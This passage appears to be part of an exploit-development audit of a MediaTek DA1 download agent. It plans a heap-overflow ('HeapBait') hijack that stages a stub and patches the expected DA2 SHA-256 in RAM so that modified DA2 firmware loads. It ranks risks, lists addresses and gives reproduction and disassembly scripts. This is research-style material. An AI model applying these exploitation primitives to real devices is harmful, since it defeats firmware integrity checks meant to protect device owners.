with `mxmlLoadString` (mallocs), the whole plan dies at step 4 unless the payload
unlinks the bogus node — which is why the stub in §4.2 contains the unlink block.
`[I]`, but mechanically forced by the four instructions above; verify in `da1_emu.py`
before the device.

Second-order hazard `[I]`: `mxmlDelete`'s `insert` calls do write `[0x2DF7A0]`
(`str r0,[r3,#4]` with `r3` = bogus), so by payload time `[0x2DF7A0]` may hold a
*freed node* rather than `H`. The unlink block above is deliberately generic
(read `prev`/`next` from the node, patch neighbours) so it is correct for either value;
`next == 0` is guarded.

---

## 5. Risk list (ranked by "kills the plan")

1. **`0x2688CC` may be write-protected on silicon.** It lives in the DA1 image
   (`0x200000..0x2689FC`). No MMU/MPU is visible in the code paths analysed, and DA1
   writes its own `.data`/`.bss` next to it, so RW is likely `[I]` — but this is
   unproven and there is **no `READ-MEMORY` in DA1** (§2.3), so you cannot read the slot
   back. Oracle available: `BOOT-TO`'s return code (`0xC0070004` = mismatch,
   continue = success). Mitigation: try the store first, then send the real DA2 and
   read the error.
2. **Free-list corruption after the fire (§4.5).** If the unlink block is wrong or
   skipped, the next `malloc` dereferences `8`. Highest-confidence software blocker;
   cheap to prove in `da1_emu.py`.
3. **Heap geometry / which chunk gets freed (§4.4).** The overflow must hit an
   *allocated* chunk that is later freed; the emulator currently hits the free
   remainder. Without the §4.1 sweep the fire never happens. Also: 64 KiB heap total,
   and `download()` needs `len+4` contiguous plus the XML tree (`mxmlLoadString` for a
   long `param_file` string is the cheapest way to shape the heap). If `malloc` fails,
   `0x250330` aborts with "malloc fail" and there is no overflow at all.
4. **Executability / caching of the staged stub at `0x40000000`.** DA1's own `BOOT-TO`
   `blx`es to `0x40000000`, so the region is executable by construction; but the stub is
   written by USB/DMA microseconds earlier — if the I-cache is enabled and the clean
   never happened, the first fetch may see stale bytes. Same risk exists for DA2 itself,
   so presumably the platform handles it `[?]`.
5. **Patched DA2 must be length-preserving.** The digest covers `len` bytes announced by
   the host; a length change also changes the hashed range and `boot_to` offsets.
   `xml_lib.patch_da()` already refuses length changes (`:395`). Keep that check.
6. **`BOOT-TO` #1 side effects.** Hash mismatch is clean (§3.7) but it logs `H1C:`/`H2C:`
   dumps and returns an error frame; the Python `boot_to()` currently treats a non
   `DwnFile` reply as fatal (`xml_lib.py:780`) — the host side must be relaxed or a
   dedicated `stage_stub()` helper added.
7. **`dpc->arg` is whatever `.bss` held** (`[0x2DF7A8]`). The stub must not depend on
   `r0`. `dpc` itself is zero at boot (the device works), otherwise `cmd_loop` would
   fire garbage on the first command.
8. **`at_address`/`jmp_address` are hard-gated to `0x40000000`** (`0x20113C`), and
   `len <= 0x1000000`. Any "load DA2 elsewhere" idea is dead on arrival.
9. **DAA/SLA is not on this path** (§3.6) — but the preloader's DA1 signature check is,
   which is exactly why the digest must be patched in RAM and not in the blob. Do not
   "just" patch `da1_allinone.bin`.
10. **No read-back primitive.** All verification is via `BOOT-TO`'s result code. Budget
    for a device-side retry loop (DA1 is re-uploadable on 200EX01).

---

## 6. Answers to the four questions in the brief

| # | question | answer |
|---|---|---|
| i | Is `patch_da_hash` needed, and where? | It is needed **only** if the DA2 body is modified before load; the write target is `0x2688CC` (32 B) in DA1 RAM. In this repo the function does not exist; the offline equivalent is `fix_hash` (`mtk_daloader.py:140`) fed by `compute_hash_pos` (`:83`). The runtime version exists only in `bkerler/mtkclient#414`. |
| ii | Does DA1 have an arbitrary-write command? | **No.** 12 commands (§2.2), none of them writes host data to a host-chosen address. `SET-RUNTIME-PARAMETER` writes a whitelisted value to a fixed global; `WRITE-FLASH`/`ERASE-FLASH` touch flash only. The only write primitive is HeapBait in `CMD:DEBUG:DRAM-REPAIR`. |
| iii | Smallest viable step-4 implementation | Stage the 112-byte stub at `0x40000000` via a failing `BOOT-TO`; one HeapBait fire sets `dpc->cb = 0x40000000`; the stub writes `sha256(patched_body)` to `0x2688CC` and unlinks the bogus free-list node; send `BOOT-TO` with the patched DA2. No SRAM agent, no `CMD:CUSTOM` in DA1, no heap address needed. |
| iv | Top blockers | (1) writability of `0x2688CC` on silicon — untestable without the device and unreadable afterwards; (2) free-list corruption from `insert()` after the fire; (3) heap geometry: the overflow must land on a chunk that is actually freed; (4) host flow must tolerate `BOOT-TO` #1's `0xC0070004`. |

---

## Appendix A — reproduction

```bash
# strings / command table
strings -t x docs/notes/rmx3630-da2/da1_allinone.bin | grep -E 'CMD:|MEMS|MEMORY'

# registrar decode (12 BL sites to 0x203BBC)
/tmp/opencode/da1venv/bin/python - <<'EOF'
import struct
IMG=open("docs/notes/rmx3630-da2/da1_allinone.bin","rb").read(); B=0x200000
for o in range(0,len(IMG)-4,4):
    w=struct.unpack_from("<I",IMG,o)[0]
    if (w>>24) in (0xEA,0xEB):
        i=w&0xFFFFFF; i-= 0x1000000 if i&0x800000 else 0
        if B+o+8+i*4==0x203bbc: print(hex(B+o))
EOF

# digest hunt (see /tmp/opencode/da1audit.py)
/tmp/opencode/da1venv/bin/python /tmp/opencode/da1audit.py

# xrefs (see /tmp/opencode/xref.py)
/tmp/opencode/da1venv/bin/python /tmp/opencode/xref.py 0x265FC4

# disassembly helper (see /tmp/opencode/da1dis.py)
/tmp/opencode/da1venv/bin/python /tmp/opencode/da1dis.py 0x201080 0x201400
```

```python
# the one-liner that settles §3.5
import hashlib
br = open("docs/notes/rmx3630-da2/DA_BR.bin","rb").read()
da2 = br[0x68AB8:0x68AB8+0x56FC8]
da1 = br[0xBC:0xBC+0x689FC]
assert hashlib.sha256(da2[:0x56EC8]).digest() == da1[0x688CC:0x688CC+0x20]
```

## Appendix B — addresses added by this audit

| VA | meaning |
|---|---|
| `0x201080` | `CMD:BOOT-TO` handler = DA2 loader + hash check + native jump |
| `0x20113C` | `at_address`/`jmp_address == 0x40000000` gate |
| `0x20128C` | the only reader of `0x2688CC` |
| `0x2012CC` | success path: `dpc->cb = 0x40000000`, `dpc->arg = 0x2DE180` |
| `0x201338` | hash-mismatch path, returns `0xC0070004`, `dpc` untouched |
| `0x2522C4` | SHA-256 wrapper, `*outlen = 0x20` |
| `0x2688CC` | expected DA2 SHA-256 (file `0x688CC`, 32 B) |
| `0x2688C8` | write-only pointer to the above (dead) |
| `0x203BBC` | `reg_cmd(name, version, handler)`, node `{+0 next, +4 version, +8 name, +0x10 handler}` |
| `0x266070` | command registry list head |
| `0x2DF7D8` | free-list sentinel; `0x2DF7DC` = first node |
| `0x2DE180` | DA2 boot-context block (magic `0xFE4A4D42` on success) |
| `0x2DE5FC` | 0xC-byte block copied into `0x2DE180+8` |
